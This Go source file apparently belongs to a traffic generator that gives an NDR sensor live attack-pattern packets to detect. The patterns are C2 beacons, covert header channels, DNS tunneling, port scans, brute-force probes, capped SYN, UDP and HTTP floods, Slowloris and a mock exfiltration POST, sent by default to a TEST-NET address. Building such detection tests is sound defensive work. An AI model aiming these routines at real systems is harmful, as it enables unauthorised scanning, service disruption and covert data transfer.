// Package main — packet_sender.go
// Option A: real TCP/UDP connections so the NDR sensor captures live packets.
// Every function dials actual sockets — the SYN/UDP packets appear on the
// monitored interface regardless of whether the destination responds.
// Gated by sender.real.enabled=true; default is false so nothing goes on the
// wire unless the operator explicitly opts in.
package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// GlobalRealHTTPClient is used for real HTTP beacon and exfiltration connections.
var GlobalRealHTTPClient *http.Client

// initRealPacketSender sets up the shared HTTP client for real connections.
func initRealPacketSender() {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering initRealPacketSender")

	GlobalRealHTTPClient = &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
			MaxIdleConnsPerHost: 1,
			DialContext: (&net.Dialer{
				Timeout: 3 * time.Second,
			}).DialContext,
		},
	}

	logInfo("Return from initRealPacketSender enabled=%v c2=%s:%d",
		realEnabled(), realC2IP(), realC2Port())
}

// realEnabled returns true when real packet sending is enabled in config.
func realEnabled() bool {
	return configBool("sender.real.enabled", false)
}

// realC2IP returns the configured destination IP for real C2/exfil traffic.
// Default is 192.0.2.1 (RFC 5737 TEST-NET — never routed, never responds,
// but the SYN still goes on the wire for NDR inspection).
func realC2IP() string {
	return configString("sender.c2.ip", "192.0.2.1")
}

// realC2Port returns the configured C2 port.
func realC2Port() int {
	return configInt("sender.c2.port", 443)
}

// ─── C2 / Beaconing ───────────────────────────────────────────────────────────

// sendRealBeacon makes real HTTP/HTTPS connections with beacon-style headers.
// Produces regular TCP SYN + application data on the wire at timed intervals.
func sendRealBeacon(dstIP string, dstPort, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealBeacon dst=%s:%d count=%d", dstIP, dstPort, count)

	scheme := "http"
	if dstPort == 443 || dstPort == 8443 {
		scheme = "https"
	}
	beaconID := randomHexString(16)

	for idx := 0; idx < count; idx++ {
		url := fmt.Sprintf("%s://%s:%d/update?id=%s&seq=%d&ts=%d",
			scheme, dstIP, dstPort, beaconID, idx, time.Now().UnixMilli())
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("X-Session-ID", beaconID)
		req.Header.Set("X-Sequence", fmt.Sprintf("%d", idx))

		resp, err := GlobalRealHTTPClient.Do(req)
		if err != nil {
			logTrace("sendRealBeacon connect: %v", err)
		} else {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
		time.Sleep(time.Duration(50+rand.Intn(50)) * time.Millisecond)
	}
	logInfo("sendRealBeacon done count=%d", count)
}

// sendRealHTTPCovert makes HTTP requests with data hidden in custom headers.
func sendRealHTTPCovert(dstIP string, dstPort, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealHTTPCovert dst=%s:%d count=%d", dstIP, dstPort, count)

	scheme := "http"
	if dstPort == 443 {
		scheme = "https"
	}

	for idx := 0; idx < count; idx++ {
		url := fmt.Sprintf("%s://%s:%d/api/status", scheme, dstIP, dstPort)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		// Data hidden in otherwise-normal-looking headers
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Request-ID", randomHexString(32))                     // exfil chunk
		req.Header.Set("X-Forwarded-For", randomHexString(16))                  // covert channel
		req.Header.Set("Accept-Language", "en-US,"+randomHexString(8)+";q=0.9") // data in lang tag

		resp, err := GlobalRealHTTPClient.Do(req)
		if err != nil {
			logTrace("sendRealHTTPCovert connect: %v", err)
		} else {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
		time.Sleep(30 * time.Millisecond)
	}
	logInfo("sendRealHTTPCovert done count=%d", count)
}

// ─── DNS ─────────────────────────────────────────────────────────────────────

// sendRealDNSQuery sends real DNS TXT queries with encoded subdomains to
// mimic DNS tunneling. Sends raw UDP DNS packets to the specified resolver.
func sendRealDNSQuery(resolverIP, domain string, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealDNSQuery resolver=%s domain=%s count=%d", resolverIP, domain, count)

	resolverAddr := net.JoinHostPort(resolverIP, "53")
	for idx := 0; idx < count; idx++ {
		encoded := randomHexString(32)
		fullDomain := encoded + "." + domain

		conn, err := net.DialTimeout("udp", resolverAddr, 2*time.Second)
		if err != nil {
			logTrace("sendRealDNSQuery dial: %v", err)
			time.Sleep(20 * time.Millisecond)
			continue
		}
		query := buildDNSQuery(fullDomain)
		conn.SetDeadline(time.Now().Add(2 * time.Second))
		conn.Write(query)
		buf := make([]byte, 512)
		conn.Read(buf)
		conn.Close()
		time.Sleep(20 * time.Millisecond)
	}
	logInfo("sendRealDNSQuery done count=%d", count)
}

// sendRealDGALookups issues real DNS A-record lookups for DGA-generated domains.
func sendRealDGALookups(domains []string) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealDGALookups count=%d", len(domains))

	for _, domain := range domains {
		net.LookupHost(domain) // NXDOMAIN is fine — the query goes on the wire
		time.Sleep(10 * time.Millisecond)
	}
	logInfo("sendRealDGALookups done count=%d", len(domains))
}

// ─── Reconnaissance ───────────────────────────────────────────────────────────

// sendRealPortScanTCP makes rapid TCP dial attempts across multiple ports.
// Each dial sends a real SYN — NDR sees the sequential scan pattern.
func sendRealPortScanTCP(dstIP string, ports []uint16) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealPortScanTCP dst=%s ports=%d", dstIP, len(ports))

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 20)

	for _, port := range ports {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(port uint16) {
			defer wg.Done()
			defer func() { <-semaphore }()
			addr := net.JoinHostPort(dstIP, fmt.Sprintf("%d", port))
			conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
			if err == nil {
				conn.Close()
			}
		}(port)
	}
	wg.Wait()
	logInfo("sendRealPortScanTCP done dst=%s", dstIP)
}

// sendRealServiceProbe connects to a service and reads its banner.
func sendRealServiceProbe(dstIP string, dstPort int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	addr := net.JoinHostPort(dstIP, fmt.Sprintf("%d", dstPort))
	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		return
	}
	conn.SetDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 256)
	conn.Read(buf) // read banner
	conn.Close()
}

// ─── Authentication / Brute Force ────────────────────────────────────────────

// sendRealTCPProbe connects to a service port and sends a protocol banner.
// Used for brute-force simulation — each call is one real TCP connection attempt.
func sendRealTCPProbe(dstIP string, dstPort int, banner []byte, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealTCPProbe dst=%s:%d count=%d", dstIP, dstPort, count)

	addr := net.JoinHostPort(dstIP, fmt.Sprintf("%d", dstPort))
	for idx := 0; idx < count; idx++ {
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil {
			logTrace("sendRealTCPProbe connect: %v", err)
			time.Sleep(100 * time.Millisecond)
			continue
		}
		conn.SetDeadline(time.Now().Add(2 * time.Second))
		if len(banner) > 0 {
			conn.Write(banner)
		}
		buf := make([]byte, 256)
		conn.Read(buf)
		conn.Close()
		time.Sleep(100 * time.Millisecond)
	}
	logInfo("sendRealTCPProbe done dst=%s:%d count=%d", dstIP, dstPort, count)
}

// ─── DoS Attacks ─────────────────────────────────────────────────────────────

// sendRealSYNProbes sends rapid TCP connection attempts to simulate SYN flood pattern.
// Each goroutine sends a real TCP SYN (capped at 50 to be safe in a test lab).
func sendRealSYNProbes(dstIP string, dstPort, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealSYNProbes dst=%s:%d count=%d", dstIP, dstPort, count)

	realCount := count
	if realCount > 50 {
		realCount = 50
	}

	addr := net.JoinHostPort(dstIP, fmt.Sprintf("%d", dstPort))
	var wg sync.WaitGroup
	for idx := 0; idx < realCount; idx++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", addr, 200*time.Millisecond)
			if err == nil {
				conn.Close()
			}
		}()
	}
	wg.Wait()
	logInfo("sendRealSYNProbes done realCount=%d", realCount)
}

// sendRealUDPBurst sends rapid UDP datagrams to a target port.
func sendRealUDPBurst(dstIP string, dstPort, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealUDPBurst dst=%s:%d count=%d", dstIP, dstPort, count)

	realCount := count
	if realCount > 100 {
		realCount = 100
	}

	addr := net.JoinHostPort(dstIP, fmt.Sprintf("%d", dstPort))
	conn, err := net.DialTimeout("udp", addr, 2*time.Second)
	if err != nil {
		logTrace("sendRealUDPBurst dial: %v", err)
		return
	}
	defer conn.Close()

	payload := make([]byte, 512)
	rand.Read(payload)
	for idx := 0; idx < realCount; idx++ {
		conn.Write(payload)
	}
	logInfo("sendRealUDPBurst done realCount=%d", realCount)
}

// sendRealHTTPFlood sends rapid real HTTP GET requests (capped at 20 for lab safety).
func sendRealHTTPFlood(dstIP string, dstPort, count int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealHTTPFlood dst=%s:%d count=%d", dstIP, dstPort, count)

	scheme := "http"
	if dstPort == 443 {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%d/", scheme, dstIP, dstPort)

	realCount := count
	if realCount > 20 {
		realCount = 20
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)

	for idx := 0; idx < realCount; idx++ {
		wg.Add(1)
		semaphore <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-semaphore }()
			req, err := http.NewRequest("GET", baseURL+"?r="+randomHexString(8), nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")
			resp, err := GlobalRealHTTPClient.Do(req)
			if err == nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}()
	}
	wg.Wait()
	logInfo("sendRealHTTPFlood done realCount=%d", realCount)
}

// sendRealSlowloris opens real TCP connections with partial HTTP headers.
// Keeps connections alive briefly to simulate Slowloris pattern (capped at 10).
func sendRealSlowloris(dstIP string, dstPort, connections int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealSlowloris dst=%s:%d connections=%d", dstIP, dstPort, connections)

	realConns := connections
	if realConns > 10 {
		realConns = 10
	}

	addr := net.JoinHostPort(dstIP, fmt.Sprintf("%d", dstPort))
	var openConns []net.Conn

	for idx := 0; idx < realConns; idx++ {
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil {
			continue
		}
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		conn.Write([]byte(fmt.Sprintf(
			"GET /?%s HTTP/1.1\r\nHost: %s\r\n", randomHexString(8), dstIP)))
		openConns = append(openConns, conn)
	}

	time.Sleep(2 * time.Second)
	for _, conn := range openConns {
		conn.Write([]byte("X-a: b\r\n"))
	}
	time.Sleep(time.Second)
	for _, conn := range openConns {
		conn.Close()
	}
	logInfo("sendRealSlowloris done openConns=%d", len(openConns))
}

// ─── Exfiltration ─────────────────────────────────────────────────────────────

// sendRealHTTPExfil sends a real HTTP POST with a large body to simulate exfiltration.
// Caps actual payload at 1 MB to keep it practical in a test lab.
func sendRealHTTPExfil(dstIP string, dstPort, dataMB int) {
	if !realEnabled() {
		return
	}
	defer panicHandler(traceFunc(), nil)
	logInfo("sendRealHTTPExfil dst=%s:%d dataMB=%d", dstIP, dstPort, dataMB)

	scheme := "http"
	if dstPort == 443 || dstPort == 8443 {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d/upload?token=%s", scheme, dstIP, dstPort, randomHexString(32))

	// Real upload capped at 1 MB; header advertises the full size
	chunk := randomHexString(64)
	body := strings.NewReader(strings.Repeat(chunk, (1*1024*1024)/len(chunk)+1))

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		logWarn("sendRealHTTPExfil request: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Updater/1.0)")
	req.Header.Set("X-Upload-Size", fmt.Sprintf("%d", dataMB*1024*1024))
	req.Header.Set("X-Session", randomHexString(16))

	resp, err := GlobalRealHTTPClient.Do(req)
	if err != nil {
		logTrace("sendRealHTTPExfil post: %v", err)
	} else {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	logInfo("sendRealHTTPExfil done dst=%s:%d", dstIP, dstPort)
}

// ─── Protocol banners ─────────────────────────────────────────────────────────

// sshClientBanner is the SSH version string sent when probing port 22.
var sshClientBanner = []byte("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n")

// rdpClientPDU is a minimal RDP Connection Request PDU (TPKT + COTP + RDP).
var rdpClientPDU = []byte{
	0x03, 0x00, 0x00, 0x13, // TPKT header: version=3, len=19
	0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, // COTP CR
	0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, // RDP negotiation request
}

// smbNegotiatePDU is a minimal SMB Negotiate Protocol Request.
// ByteCount + Dialect string so it's a structurally complete SMB1
// Negotiate Request, not just a truncated header):
var smbNegotiatePDU = []byte{
	0x00, 0x00, 0x00, 0x2f, // NetBIOS header, length=47
	0xff, 0x53, 0x4d, 0x42, // Protocol
	0x72,                   // Command: Negotiate
	0x00, 0x00, 0x00, 0x00, // Status
	0x18,       // Flags
	0xc8, 0x00, // Flags2
	0x00, 0x00, // PIDHigh
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SecurityFeatures
	0x00, 0x00, // Reserved
	0x00, 0x00, // TID
	0x00, 0x00, // PIDLow
	0x00, 0x00, // UID
	0x00, 0x00, // MID
	0x00,       // Word Count: 0
	0x0c, 0x00, // Byte Count: 12
	0x02, 'N', 'T', ' ', 'L', 'M', ' ', '0', '.', '1', '2', 0x00,
}
